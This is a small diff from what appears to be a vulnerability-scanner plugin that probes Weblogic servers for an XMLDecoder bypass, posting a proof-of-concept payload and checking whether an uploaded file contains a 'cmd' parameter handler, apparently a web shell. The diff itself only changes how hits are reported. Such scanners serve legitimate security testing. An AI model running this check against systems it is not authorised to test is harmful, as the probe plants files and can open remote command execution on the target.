@@ -23035,8 +23035,7 @@ class Script(BaseScript):
                 async with session.post(url=url1, headers=headers1, data=coordinatorportype_poc) as res:
                     if res!=None and ran in await res.text():
                         self.flag = 1
-                        self.res.append({"info": url1, "key": 'Weblogic XMLdecode bypass'})
-                        return
+                        yield url1
                     else:
                         url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
                         filename = ran + '.txt'
@@ -23052,7 +23051,7 @@ class Script(BaseScript):
                                     text = await res21.text()
                                     if 'request.getParameter("cmd")' in text:
                                         yield url21
-                                        return
+                                        
 
 
     async def exec(self):
